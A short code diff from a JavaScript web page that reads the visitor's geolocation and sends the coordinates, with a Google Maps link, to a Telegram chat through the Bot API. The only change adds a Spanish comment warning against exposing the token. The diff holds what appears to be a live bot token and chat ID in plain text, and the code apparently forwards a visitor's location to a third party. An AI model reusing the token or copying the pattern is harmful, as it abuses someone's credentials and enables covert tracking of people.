@@ -23,7 +23,7 @@
             let lon = position.coords.longitude;
             let mensaje = `Ubicación recibida:\nLatitud: ${lat}\nLongitud: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
 
-            let botToken = "7942913397:AAH7v5CiM27nKvV7IsK3T3TRnE-LJm5doQ0"; 
+            let botToken = "7942913397:AAH7v5CiM27nKvV7IsK3T3TRnE-LJm5doQ0"; // ⚠️ No recomendado exponerlo
             let chatId = "1617751854"; 
 
             let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
